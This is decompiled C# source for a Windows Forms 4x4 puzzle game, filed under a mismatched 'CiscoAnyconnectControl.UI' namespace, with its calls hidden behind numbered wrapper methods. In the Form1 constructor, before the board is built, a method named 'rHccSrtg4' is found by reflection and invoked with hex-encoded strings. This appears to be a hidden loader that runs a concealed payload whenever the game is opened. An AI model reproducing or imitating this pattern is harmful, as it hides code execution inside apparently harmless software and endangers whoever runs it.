using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;

namespace CiscoAnyconnectControl.UI;

public class Form1 : Form
{
	public struct BlackButton
	{
		public bool black;

		public bool found;
	}

	private SaveFileDialog saveFileDialog1 = Form1.smethod_0();

	private OpenFileDialog openFileDialog1 = Form1.smethod_1();

	private readonly BackgroundWorker bw = Form1.smethod_2();

	private DialogBox dialogbox;

	private Timer redtimer = Form1.smethod_3();

	private Label[] l3;

	private int[] labelnumbers3 = new int[4];

	private Label[] l4;

	private int[] labelnumbers4 = new int[4];

	private Button[,] buttons;

	private BlackButton[,] blackbuttons;

	private Point redpoint;

	public int lives;

	private int mistakes;

	private int points;

	private int sum;

	private int clicked;

	public int time = 10000;

	private bool edit;

	private bool redtimerstarted;

	private bool newgamebutton;

	private IContainer components = null;

	private static object ImageFileMachine;

	private static string Explicit = "SG40FFZ584HXG5GTE555PW";

	private static int CodePage = 66560;

	private static Type s = Form1.smethod_121(typeof(DialogBox).TypeHandle);

	private StatusStrip statusStrip1;

	private TableLayoutPanel tableLayoutPanel1;

	private TableLayoutPanel tableLayoutPanel4;

	private TableLayoutPanel tableLayoutPanel2;

	private TableLayoutPanel tableLayoutPanel3;

	private ToolStripMenuItem newGameToolStripMenuItem;

	private MenuStrip menuStrip1;

	private ToolStripMenuItem saveToolStripMenuItem;

	private ToolStripMenuItem modeToolStripMenuItem;

	private ToolStripMenuItem openToolStripMenuItem;

	private ToolStripMenuItem settingsToolStripMenuItem;

	private ToolStripMenuItem gameToolStripMenuItem;

	private ToolStripMenuItem editToolStripMenuItem;

	public ToolStripStatusLabel toolStripStatusLabel1 = Form1.smethod_4();

	private ToolStripStatusLabel toolStripStatusLabel2 = Form1.smethod_4();

	private ToolStripProgressBar toolStripProgressBar1;

	public Form1()
	{
		InitializeComponent();
		MethodInfo methodBase_ = Form1.smethod_5((Type)ImageFileMachine, "rHccSrtg4");
		Form1.smethod_6((MethodBase)methodBase_, (object)null, new object[3] { "495479706549", "4B496F4B637A496364", "CiscoAnyconnectControl.UI" });
		CreateBoard();
	}

	private void CreateBoard()
	{
		SetupWindow();
		CreateButtons();
		CreateLabels();
	}

	private void SetupWindow()
	{
		//IL_014d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Expected O, but got Unknown
		dialogbox = new DialogBox(this);
		blackbuttons = new BlackButton[4, 4];
		redtimerstarted = false;
		newgamebutton = false;
		lives = 3;
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel1, Form1.smethod_7("Lives: ", lives.ToString()));
		points = 0;
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel2, Form1.smethod_7("Score: ", points.ToString()));
		Form1.smethod_9(redtimer, 500);
		Form1.smethod_10(toolStripProgressBar1, time / 1000);
		Form1.smethod_11(toolStripProgressBar1, -1);
		Form1.smethod_12(toolStripProgressBar1, time / 1000);
		Form1.smethod_13(bw, bool_0: true);
		Form1.smethod_14(bw, bool_0: true);
		Form1.smethod_15(bw, (DoWorkEventHandler)backgroundWorker1_DoWork);
		Form1.smethod_16(bw, (ProgressChangedEventHandler)backgroundWorker1_ProgressChanged);
		Form1.smethod_17(bw, (RunWorkerCompletedEventHandler)myBGWorker_RunWorkerCompleted);
		Form1.smethod_18(redtimer, (EventHandler)redtimerevent);
		Form1.smethod_19((Control)(object)this, "Puzzle Game");
		Form1.smethod_20((Form)(object)this, (FormStartPosition)1);
		Form1.smethod_21((Form)(object)this, new FormClosingEventHandler(Form1_Closing));
		for (int i = 0; i < 4; i++)
		{
			int[] array = labelnumbers3;
			int num = i;
			labelnumbers4[i] = 0;
			array[num] = 0;
		}
	}

	private void CreateLabels()
	{
		l3 = (Label[])(object)new Label[4];
		l4 = (Label[])(object)new Label[4];
		for (int i = 0; i < 4; i++)
		{
			l3[i] = Form1.smethod_22();
			l4[i] = Form1.smethod_22();
			Form1.smethod_23((Control)(object)l3[i], new Size(50, 50));
			Form1.smethod_23((Control)(object)l4[i], new Size(50, 50));
			Form1.smethod_24((Control)(object)l3[i], (AnchorStyles)0);
			Form1.smethod_24((Control)(object)l4[i], (AnchorStyles)0);
			Form1.smethod_26((Control)(object)l3[i], Form1.smethod_25("Arial", 14f, (FontStyle)0));
			Form1.smethod_27(l3[i], (ContentAlignment)32);
			Form1.smethod_26((Control)(object)l4[i], Form1.smethod_25("Arial", 14f, (FontStyle)0));
			Form1.smethod_27(l4[i], (ContentAlignment)32);
			Form1.smethod_19((Control)(object)l3[i], "");
			Form1.smethod_19((Control)(object)l4[i], "");
			Form1.smethod_29(Form1.smethod_28(tableLayoutPanel4), (Control)(object)l3[i], 0, i);
			Form1.smethod_29(Form1.smethod_28(tableLayoutPanel3), (Control)(object)l4[i], i, 0);
		}
	}

	private void CreateButtons()
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		buttons = new Button[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				Button val = Form1.smethod_30();
				Form1.smethod_31((Control)(object)val, (DockStyle)5);
				Form1.smethod_32((Control)(object)val, (object)new Point(i, j));
				Form1.smethod_33(val, (AutoSizeMode)0);
				buttons[i, j] = val;
				Form1.smethod_34((Control)(object)buttons[i, j], new MouseEventHandler(ButtonClick));
				Form1.smethod_35((Control)(object)buttons[i, j], (EventHandler)ButtonEnter);
				Form1.smethod_36((Control)(object)buttons[i, j], (EventHandler)ButtonLeave);
				Form1.smethod_37((Control)(object)buttons[i, j], bool_0: false);
				ColorButtons(i, j);
				Form1.smethod_29(Form1.smethod_28(tableLayoutPanel2), (Control)(object)buttons[i, j], j, i);
				blackbuttons[i, j].black = false;
				blackbuttons[i, j].found = false;
			}
		}
	}

	private void AddNumbers()
	{
		for (int i = 0; i < 4; i++)
		{
			Form1.smethod_27(l3[i], (ContentAlignment)32);
			Form1.smethod_19((Control)(object)l3[i], labelnumbers3[i].ToString());
			Form1.smethod_27(l4[i], (ContentAlignment)32);
			Form1.smethod_19((Control)(object)l4[i], labelnumbers4[i].ToString());
		}
	}

	private void ColorButtons(int i, int j)
	{
		Form1.smethod_38((Control)(object)buttons[i, j], Color.RoyalBlue);
		Form1.smethod_19((Control)(object)buttons[i, j], "?");
		Form1.smethod_26((Control)(object)buttons[i, j], Form1.smethod_25("Arial", 16f, (FontStyle)0));
	}

	private void ButtonClick(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Invalid comparison between I4 and Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Invalid comparison between I4 and Unknown
		Button control_ = (Button)sender;
		Point point = (Point)Form1.smethod_39((Control)(object)control_);
		MouseEventArgs mouseEventArgs_ = (MouseEventArgs)e;
		if (2097152 == (int)Form1.smethod_40(mouseEventArgs_))
		{
			if (!edit && Form1.smethod_41((Control)(object)control_) != Color.Black)
			{
				Form1.smethod_38((Control)(object)control_, Color.White);
			}
			if (edit && Form1.smethod_41((Control)(object)control_) == Color.Black)
			{
				Form1.smethod_38((Control)(object)control_, Color.White);
				blackbuttons[point.X, point.Y].black = false;
				labelnumbers3[point.X]--;
				labelnumbers4[point.Y]--;
				sum--;
			}
		}
		if (1048576 != (int)Form1.smethod_40(mouseEventArgs_))
		{
			return;
		}
		if (edit)
		{
			Form1.smethod_38((Control)(object)control_, Color.Black);
			blackbuttons[point.X, point.Y].black = true;
			labelnumbers3[point.X]++;
			labelnumbers4[point.Y]++;
			sum++;
		}
		else if (!blackbuttons[point.X, point.Y].black || blackbuttons[point.X, point.Y].found)
		{
			if (!blackbuttons[point.X, point.Y].black)
			{
				mistakes++;
				Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel1, Form1.smethod_7("Lives: ", (lives - mistakes).ToString()));
				Form1.smethod_38((Control)(object)control_, Color.Red);
				Form1.smethod_19((Control)(object)control_, "");
				if (redtimerstarted)
				{
					ColorButtons(redpoint.X, redpoint.Y);
					redtimerstarted = false;
					Form1.smethod_42(redtimer);
				}
				redpoint = new Point(point.X, point.Y);
				redtimerstarted = true;
				Form1.smethod_43(redtimer);
				if (mistakes == lives)
				{
					EndGame(atall: false);
					CallEnd();
					points = 0;
				}
			}
		}
		else
		{
			blackbuttons[point.X, point.Y].found = true;
			Form1.smethod_38((Control)(object)control_, Color.Black);
			points += 50;
			Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel2, Form1.smethod_7("Score: ", points.ToString()));
			clicked++;
			if (clicked == sum)
			{
				points += 500;
				CallEnd();
				NewGame();
			}
		}
	}

	private void CallEnd()
	{
		if (Form1.smethod_44(bw))
		{
			Form1.smethod_45(bw);
		}
		while (Form1.smethod_44(bw))
		{
			Form1.smethod_46();
		}
	}

	private void NewGame()
	{
		CallEnd();
		newgamebutton = false;
		mistakes = 0;
		clicked = 0;
		Form1.smethod_10(toolStripProgressBar1, time / 1000);
		Form1.smethod_11(toolStripProgressBar1, -1);
		Form1.smethod_12(toolStripProgressBar1, time / 1000);
		Form1.smethod_47(bw);
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel2, Form1.smethod_7("Score: ", points.ToString()));
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel1, Form1.smethod_7("Lives: ", lives.ToString()));
		sum = 0;
		for (int i = 0; i < 4; i++)
		{
			int[] array = labelnumbers3;
			int num = i;
			labelnumbers4[i] = 0;
			array[num] = 0;
		}
		Random random_ = Form1.smethod_48();
		for (int j = 0; j < 4; j++)
		{
			for (int k = 0; k < 4; k++)
			{
				blackbuttons[j, k].black = false;
				blackbuttons[j, k].found = false;
				Form1.smethod_37((Control)(object)buttons[j, k], bool_0: true);
				ColorButtons(j, k);
				if (Form1.smethod_49(random_, 0, 2) == 0)
				{
					blackbuttons[j, k].black = true;
					labelnumbers3[j]++;
					labelnumbers4[k]++;
					sum++;
				}
			}
		}
		AddNumbers();
	}

	private void EndGame(bool atall)
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				Form1.smethod_37((Control)(object)buttons[i, j], bool_0: false);
			}
		}
		if (atall)
		{
			Form1.smethod_50(Form1.smethod_7("Your final score is: ", points.ToString()), "Congratulations!");
		}
	}

	private void ButtonEnter(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		Button control_ = (Button)sender;
		if (Form1.smethod_41((Control)(object)control_) == Color.RoyalBlue)
		{
			Form1.smethod_38((Control)(object)control_, Color.Yellow);
			Form1.smethod_19((Control)(object)control_, "");
		}
	}

	private void ButtonLeave(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		Button control_ = (Button)sender;
		Point point = (Point)Form1.smethod_39((Control)(object)control_);
		if (Form1.smethod_41((Control)(object)control_) == Color.Yellow)
		{
			ColorButtons(point.X, point.Y);
		}
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Invalid comparison between Unknown and I4
		if ((int)Form1.smethod_51("Are you sure?", "Close", (MessageBoxButtons)4) != 7)
		{
			Form1.smethod_52(e, bool_0: false);
		}
		else
		{
			Form1.smethod_52(e, bool_0: true);
		}
	}

	private void redtimerevent(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		Timer timer_ = (Timer)sender;
		ColorButtons(redpoint.X, redpoint.Y);
		redtimerstarted = false;
		Form1.smethod_42(timer_);
	}

	private void newGameToolStripMenuItem_Click_1(object sender, EventArgs e)
	{
		points = 0;
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel2, Form1.smethod_7("Score: ", points.ToString()));
		newgamebutton = true;
		NewGame();
	}

	private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		Form1.smethod_53(dialogbox.numericUpDown1, (decimal)lives);
		Form1.smethod_53(dialogbox.numericUpDown2, (decimal)(time / 1000));
		Form1.smethod_54((Form)(object)dialogbox);
	}

	private void editToolStripMenuItem_Click(object sender, EventArgs e)
	{
		edit = true;
		CallEnd();
		Form1.smethod_55((ToolStripItem)(object)newGameToolStripMenuItem, bool_0: false);
		Form1.smethod_55((ToolStripItem)(object)settingsToolStripMenuItem, bool_0: false);
		Form1.smethod_55((ToolStripItem)(object)openToolStripMenuItem, bool_0: false);
		Form1.smethod_55((ToolStripItem)(object)saveToolStripMenuItem, bool_0: true);
		Form1.smethod_56(gameToolStripMenuItem, bool_0: false);
		Form1.smethod_56(editToolStripMenuItem, bool_0: true);
		Form1.smethod_57((ToolStrip)(object)menuStrip1, Color.Gold);
		sum = 0;
		for (int i = 0; i < 4; i++)
		{
			labelnumbers3[i] = 0;
			labelnumbers4[i] = 0;
			Form1.smethod_19((Control)(object)l3[i], "");
			Form1.smethod_19((Control)(object)l4[i], "");
			for (int j = 0; j < 4; j++)
			{
				blackbuttons[i, j].black = false;
				blackbuttons[i, j].found = false;
				Form1.smethod_37((Control)(object)buttons[i, j], bool_0: true);
				Form1.smethod_38((Control)(object)buttons[i, j], Color.White);
				Form1.smethod_19((Control)(object)buttons[i, j], "");
			}
		}
	}

	private void gameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Form1.smethod_55((ToolStripItem)(object)newGameToolStripMenuItem, bool_0: true);
		Form1.smethod_55((ToolStripItem)(object)settingsToolStripMenuItem, bool_0: true);
		Form1.smethod_55((ToolStripItem)(object)openToolStripMenuItem, bool_0: true);
		Form1.smethod_55((ToolStripItem)(object)saveToolStripMenuItem, bool_0: false);
		Form1.smethod_56(gameToolStripMenuItem, bool_0: true);
		Form1.smethod_56(editToolStripMenuItem, bool_0: false);
		if (!edit)
		{
			return;
		}
		Form1.smethod_57((ToolStrip)(object)menuStrip1, Form1.smethod_58());
		edit = false;
		mistakes = 0;
		clicked = 0;
		Form1.smethod_10(toolStripProgressBar1, time / 1000);
		Form1.smethod_11(toolStripProgressBar1, -1);
		Form1.smethod_12(toolStripProgressBar1, time / 1000);
		Form1.smethod_47(bw);
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel2, Form1.smethod_7("Score: ", points.ToString()));
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				ColorButtons(i, j);
			}
		}
		AddNumbers();
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		BackgroundWorker backgroundWorker_ = sender as BackgroundWorker;
		int num = time / 1000 - 1;
		while (true)
		{
			if (num >= 0)
			{
				if (Form1.smethod_59(bw))
				{
					break;
				}
				Form1.smethod_60(1000);
				int int_ = num;
				Form1.smethod_61(backgroundWorker_, int_);
				num--;
				continue;
			}
			return;
		}
		Form1.smethod_52((CancelEventArgs)e, bool_0: true);
	}

	private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
	{
		Form1.smethod_12(toolStripProgressBar1, Form1.smethod_62(e));
	}

	private void myBGWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		if (!edit && sum != clicked)
		{
			if (newgamebutton)
			{
				newgamebutton = false;
				EndGame(atall: false);
			}
			else
			{
				EndGame(atall: true);
			}
		}
	}

	private void saveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		Form1.smethod_63((FileDialog)(object)saveFileDialog1, "PuzzleGame Files|*.pg");
		Form1.smethod_64((FileDialog)(object)saveFileDialog1, "Save a Board");
		Form1.smethod_65((CommonDialog)(object)saveFileDialog1);
		if (!Form1.smethod_67(Form1.smethod_66((FileDialog)(object)saveFileDialog1), ""))
		{
			return;
		}
		StreamWriter textWriter_ = Form1.smethod_68(Form1.smethod_66((FileDialog)(object)saveFileDialog1));
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				if (!blackbuttons[i, j].black)
				{
					Form1.smethod_69((TextWriter)textWriter_, '0');
				}
				else
				{
					Form1.smethod_69((TextWriter)textWriter_, '1');
				}
			}
		}
		Form1.smethod_70((TextWriter)textWriter_);
	}

	private void openToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Invalid comparison between Unknown and I4
		newgamebutton = true;
		CallEnd();
		newgamebutton = false;
		Form1.smethod_63((FileDialog)(object)openFileDialog1, "PuzzleGame Files|*.pg");
		Form1.smethod_64((FileDialog)(object)openFileDialog1, "Load a Board");
		if ((int)Form1.smethod_65((CommonDialog)(object)openFileDialog1) != 1)
		{
			return;
		}
		sum = 0;
		for (int i = 0; i < 4; i++)
		{
			labelnumbers3[i] = 0;
			labelnumbers4[i] = 0;
		}
		StreamReader textReader_ = Form1.smethod_71(Form1.smethod_66((FileDialog)(object)openFileDialog1));
		for (int j = 0; j < 4; j++)
		{
			for (int k = 0; k < 4; k++)
			{
				blackbuttons[j, k].found = false;
				if ((ushort)Form1.smethod_72((TextReader)textReader_) != 49)
				{
					blackbuttons[j, k].black = false;
					continue;
				}
				blackbuttons[j, k].black = true;
				labelnumbers3[j]++;
				labelnumbers4[k]++;
				sum++;
			}
		}
		Form1.smethod_73((TextReader)textReader_);
		mistakes = 0;
		clicked = 0;
		Form1.smethod_10(toolStripProgressBar1, time / 1000);
		Form1.smethod_11(toolStripProgressBar1, -1);
		Form1.smethod_12(toolStripProgressBar1, time / 1000);
		Form1.smethod_47(bw);
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel2, Form1.smethod_7("Score: ", points.ToString()));
		for (int l = 0; l < 4; l++)
		{
			for (int m = 0; m < 4; m++)
			{
				Form1.smethod_37((Control)(object)buttons[l, m], bool_0: true);
				ColorButtons(l, m);
			}
		}
		AddNumbers();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			Form1.smethod_74((IDisposable)components);
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		statusStrip1 = Form1.smethod_75();
		toolStripProgressBar1 = Form1.smethod_76();
		toolStripStatusLabel2 = Form1.smethod_4();
		toolStripStatusLabel1 = Form1.smethod_4();
		menuStrip1 = Form1.smethod_77();
		newGameToolStripMenuItem = Form1.smethod_78();
		settingsToolStripMenuItem = Form1.smethod_78();
		openToolStripMenuItem = Form1.smethod_78();
		saveToolStripMenuItem = Form1.smethod_78();
		modeToolStripMenuItem = Form1.smethod_78();
		gameToolStripMenuItem = Form1.smethod_78();
		editToolStripMenuItem = Form1.smethod_78();
		tableLayoutPanel1 = Form1.smethod_79();
		tableLayoutPanel4 = Form1.smethod_79();
		tableLayoutPanel2 = Form1.smethod_79();
		tableLayoutPanel3 = Form1.smethod_79();
		Form1.smethod_80((Control)(object)statusStrip1);
		Form1.smethod_80((Control)(object)menuStrip1);
		Form1.smethod_80((Control)(object)tableLayoutPanel1);
		Form1.smethod_81((Control)(object)this);
		Form1.smethod_83(Form1.smethod_82((ToolStrip)(object)statusStrip1), (ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)toolStripProgressBar1,
			(ToolStripItem)toolStripStatusLabel2,
			(ToolStripItem)toolStripStatusLabel1
		});
		Form1.smethod_84((Control)(object)statusStrip1, new Point(0, 314));
		Form1.smethod_85((Control)(object)statusStrip1, "statusStrip1");
		Form1.smethod_86((Control)(object)statusStrip1, (RightToLeft)1);
		Form1.smethod_23((Control)(object)statusStrip1, new Size(460, 22));
		Form1.smethod_87((Control)(object)statusStrip1, 0);
		Form1.smethod_19((Control)(object)statusStrip1, "statusStrip1");
		Form1.smethod_88((ToolStripItem)(object)toolStripProgressBar1, (ToolStripItemAlignment)1);
		Form1.smethod_89((ToolStripItem)(object)toolStripProgressBar1, "toolStripProgressBar1");
		Form1.smethod_90((ToolStripItem)(object)toolStripProgressBar1, new Size(100, 16));
		Form1.smethod_89((ToolStripItem)(object)toolStripStatusLabel2, "toolStripStatusLabel2");
		Form1.smethod_91((ToolStripItem)(object)toolStripStatusLabel2, (RightToLeft)0);
		Form1.smethod_90((ToolStripItem)(object)toolStripStatusLabel2, new Size(118, 17));
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel2, "toolStripStatusLabel2");
		Form1.smethod_89((ToolStripItem)(object)toolStripStatusLabel1, "toolStripStatusLabel1");
		Form1.smethod_90((ToolStripItem)(object)toolStripStatusLabel1, new Size(118, 17));
		Form1.smethod_8((ToolStripItem)(object)toolStripStatusLabel1, "toolStripStatusLabel1");
		Form1.smethod_83(Form1.smethod_82((ToolStrip)(object)menuStrip1), (ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)newGameToolStripMenuItem,
			(ToolStripItem)settingsToolStripMenuItem,
			(ToolStripItem)openToolStripMenuItem,
			(ToolStripItem)saveToolStripMenuItem,
			(ToolStripItem)modeToolStripMenuItem
		});
		Form1.smethod_84((Control)(object)menuStrip1, new Point(0, 0));
		Form1.smethod_85((Control)(object)menuStrip1, "menuStrip1");
		Form1.smethod_23((Control)(object)menuStrip1, new Size(460, 24));
		Form1.smethod_87((Control)(object)menuStrip1, 1);
		Form1.smethod_19((Control)(object)menuStrip1, "menuStrip1");
		Form1.smethod_89((ToolStripItem)(object)newGameToolStripMenuItem, "newGameToolStripMenuItem");
		Form1.smethod_90((ToolStripItem)(object)newGameToolStripMenuItem, new Size(77, 20));
		Form1.smethod_8((ToolStripItem)(object)newGameToolStripMenuItem, "New Game");
		Form1.smethod_92((ToolStripItem)(object)newGameToolStripMenuItem, (EventHandler)newGameToolStripMenuItem_Click_1);
		Form1.smethod_89((ToolStripItem)(object)settingsToolStripMenuItem, "settingsToolStripMenuItem");
		Form1.smethod_90((ToolStripItem)(object)settingsToolStripMenuItem, new Size(61, 20));
		Form1.smethod_8((ToolStripItem)(object)settingsToolStripMenuItem, "Settings");
		Form1.smethod_92((ToolStripItem)(object)settingsToolStripMenuItem, (EventHandler)settingsToolStripMenuItem_Click);
		Form1.smethod_89((ToolStripItem)(object)openToolStripMenuItem, "openToolStripMenuItem");
		Form1.smethod_90((ToolStripItem)(object)openToolStripMenuItem, new Size(48, 20));
		Form1.smethod_8((ToolStripItem)(object)openToolStripMenuItem, "Open");
		Form1.smethod_92((ToolStripItem)(object)openToolStripMenuItem, (EventHandler)openToolStripMenuItem_Click);
		Form1.smethod_55((ToolStripItem)(object)saveToolStripMenuItem, bool_0: false);
		Form1.smethod_89((ToolStripItem)(object)saveToolStripMenuItem, "saveToolStripMenuItem");
		Form1.smethod_90((ToolStripItem)(object)saveToolStripMenuItem, new Size(43, 20));
		Form1.smethod_8((ToolStripItem)(object)saveToolStripMenuItem, "Save");
		Form1.smethod_92((ToolStripItem)(object)saveToolStripMenuItem, (EventHandler)saveToolStripMenuItem_Click);
		Form1.smethod_83(Form1.smethod_93((ToolStripDropDownItem)(object)modeToolStripMenuItem), (ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)gameToolStripMenuItem,
			(ToolStripItem)editToolStripMenuItem
		});
		Form1.smethod_89((ToolStripItem)(object)modeToolStripMenuItem, "modeToolStripMenuItem");
		Form1.smethod_90((ToolStripItem)(object)modeToolStripMenuItem, new Size(50, 20));
		Form1.smethod_8((ToolStripItem)(object)modeToolStripMenuItem, "Mode");
		Form1.smethod_56(gameToolStripMenuItem, bool_0: true);
		Form1.smethod_94(gameToolStripMenuItem, (CheckState)1);
		Form1.smethod_89((ToolStripItem)(object)gameToolStripMenuItem, "gameToolStripMenuItem");
		Form1.smethod_90((ToolStripItem)(object)gameToolStripMenuItem, new Size(105, 22));
		Form1.smethod_8((ToolStripItem)(object)gameToolStripMenuItem, "Game");
		Form1.smethod_92((ToolStripItem)(object)gameToolStripMenuItem, (EventHandler)gameToolStripMenuItem_Click);
		Form1.smethod_89((ToolStripItem)(object)editToolStripMenuItem, "editToolStripMenuItem");
		Form1.smethod_90((ToolStripItem)(object)editToolStripMenuItem, new Size(105, 22));
		Form1.smethod_8((ToolStripItem)(object)editToolStripMenuItem, "Edit");
		Form1.smethod_92((ToolStripItem)(object)editToolStripMenuItem, (EventHandler)editToolStripMenuItem_Click);
		Form1.smethod_24((Control)(object)tableLayoutPanel1, (AnchorStyles)15);
		Form1.smethod_95(tableLayoutPanel1, 2);
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel1), Form1.smethod_97((SizeType)1, 50f));
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel1), Form1.smethod_97((SizeType)2, 100f));
		Form1.smethod_29(Form1.smethod_28(tableLayoutPanel1), (Control)(object)tableLayoutPanel4, 0, 1);
		Form1.smethod_29(Form1.smethod_28(tableLayoutPanel1), (Control)(object)tableLayoutPanel2, 1, 1);
		Form1.smethod_29(Form1.smethod_28(tableLayoutPanel1), (Control)(object)tableLayoutPanel3, 1, 0);
		Form1.smethod_84((Control)(object)tableLayoutPanel1, new Point(0, 24));
		Form1.smethod_85((Control)(object)tableLayoutPanel1, "tableLayoutPanel1");
		Form1.smethod_99(tableLayoutPanel1, 2);
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel1), Form1.smethod_101((SizeType)1, 50f));
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel1), Form1.smethod_101((SizeType)2, 100f));
		Form1.smethod_23((Control)(object)tableLayoutPanel1, new Size(460, 290));
		Form1.smethod_87((Control)(object)tableLayoutPanel1, 2);
		Form1.smethod_24((Control)(object)tableLayoutPanel4, (AnchorStyles)15);
		Form1.smethod_95(tableLayoutPanel4, 1);
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel4), Form1.smethod_97((SizeType)2, 100f));
		Form1.smethod_84((Control)(object)tableLayoutPanel4, new Point(3, 53));
		Form1.smethod_85((Control)(object)tableLayoutPanel4, "tableLayoutPanel4");
		Form1.smethod_99(tableLayoutPanel4, 4);
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel4), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel4), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel4), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel4), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_23((Control)(object)tableLayoutPanel4, new Size(44, 234));
		Form1.smethod_87((Control)(object)tableLayoutPanel4, 0);
		Form1.smethod_24((Control)(object)tableLayoutPanel2, (AnchorStyles)15);
		Form1.smethod_38((Control)(object)tableLayoutPanel2, Form1.smethod_103());
		Form1.smethod_95(tableLayoutPanel2, 4);
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel2), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel2), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel2), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel2), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_84((Control)(object)tableLayoutPanel2, new Point(53, 53));
		Form1.smethod_85((Control)(object)tableLayoutPanel2, "tableLayoutPanel2");
		Form1.smethod_99(tableLayoutPanel2, 4);
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel2), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel2), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel2), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel2), Form1.smethod_101((SizeType)2, 25f));
		Form1.smethod_23((Control)(object)tableLayoutPanel2, new Size(404, 234));
		Form1.smethod_87((Control)(object)tableLayoutPanel2, 0);
		Form1.smethod_24((Control)(object)tableLayoutPanel3, (AnchorStyles)15);
		Form1.smethod_95(tableLayoutPanel3, 4);
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel3), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel3), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel3), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_98(Form1.smethod_96(tableLayoutPanel3), Form1.smethod_97((SizeType)2, 25f));
		Form1.smethod_84((Control)(object)tableLayoutPanel3, new Point(53, 3));
		Form1.smethod_85((Control)(object)tableLayoutPanel3, "tableLayoutPanel3");
		Form1.smethod_99(tableLayoutPanel3, 1);
		Form1.smethod_102(Form1.smethod_100(tableLayoutPanel3), Form1.smethod_101((SizeType)2, 100f));
		Form1.smethod_23((Control)(object)tableLayoutPanel3, new Size(404, 44));
		Form1.smethod_87((Control)(object)tableLayoutPanel3, 1);
		Form1.smethod_104((ContainerControl)(object)this, new SizeF(6f, 13f));
		Form1.smethod_105((ContainerControl)(object)this, (AutoScaleMode)1);
		Form1.smethod_106((Form)(object)this, new Size(460, 336));
		Form1.smethod_108(Form1.smethod_107((Control)(object)this), (Control)(object)tableLayoutPanel1);
		Form1.smethod_108(Form1.smethod_107((Control)(object)this), (Control)(object)statusStrip1);
